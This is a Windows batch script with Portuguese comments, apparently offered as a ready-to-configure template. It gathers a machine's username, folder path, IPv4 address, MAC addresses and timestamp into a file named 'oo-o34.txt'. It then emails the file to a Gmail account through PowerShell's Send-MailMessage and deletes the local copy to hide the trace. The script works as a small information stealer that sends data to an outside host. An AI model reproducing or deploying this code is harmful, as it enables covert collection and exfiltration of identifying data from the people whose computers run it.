@echo off
setlocal enabledelayedexpansion

echo Usuario Registrado: %USERNAME% > oo-o34.txt
echo Local do Arquivo (script.txt) Registrado: %CD% >> oo-o34.txt

set "ip="
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
    set "ip=%%a"
)

if defined ip (
    call echo IP Registrado: %%ip:~1%% >> oo-o34.txt
) else (
    echo IP Registrado: Não encontrado >> oo-o34.txt
)

echo MACs Registrados: >> oo-o34.txt
for /f "tokens=1 delims=," %%m in ('getmac /fo csv ^| findstr /r "[0-9A-Fa-f][0-9A-Fa-f]-[0-9A-Fa-f][0-9A-Fa-f]-[0-9A-Fa-f][0-9A-Fa-f]-[0-9A-Fa-f][0-9A-Fa-f]-[0-9A-Fa-f][0-9A-Fa-f]-[0-9A-Fa-f][0-9A-Fa-f]"') do (
    echo %%~m >> oo-o34.txt
)

echo Hora Registrada: %TIME% >> oo-o34.txt
echo Data Registrada: %DATE% >> oo-o34.txt

setlocal

set "FILENAME=oo-o34.txt"
set "BATDIR=%~dp0"
set "ATTACHMENT=%BATDIR%%FILENAME%"

:: COMECE COLOCAR OS REQUISITOS ABAIXO E PRA CIMA NÃO MECHER!

set "FROM=Coloque_seu_gmail@gmail.com" :: Coloque seu Gmail para enviar o Arquivo com as informações.
set "TO=Coloque_seu_gmail@gmail.com" :: Coloque novamente seu gmail igual ao anterior.
set "SUBJECT=ASSUNTO" :: Titulo do Envio.
set "BODY=DESCRIÇÃO" :: Descrição do Envio.
set "SMTP=smtp.gmail.com" :: NÃO MECHER!
set "PORT=587" :: NÃO MECHER!
set "USER=Coloque_seu_gmail@gmail.com" :: Coloque novamente seu gmail igual ao anterior. (Denovo)
set "NAME=Coloque_sua_senha_do_app_do_gmail! :: Coloque a Senha do App do Gmail colocado.

:: NÃO MECHER DAQUI EM DIANTE PARA NÃO DAR ERRO!

PowerShell -Command ^
$EmailFrom='%FROM%'; ^
$EmailTo='%TO%'; ^
$Subject='%SUBJECT%'; ^
$Body='%BODY%'; ^
$SMTPServer='%SMTP%'; ^
$SMTPPort=%PORT%; ^
$Username='%USER%'; ^
$Name='%NAME%'; ^
$SecurePassword = ConvertTo-SecureString $Name -AsPlainText -Force; ^
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword); ^
Send-MailMessage -From $EmailFrom -To $EmailTo -Subject $Subject -Body $Body -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Credential -Attachments '%ATTACHMENT%' -Encoding UTF8

endlocal

if exist "%~dp0oo-o34.txt" del /q "%~dp0oo-o34.txt"
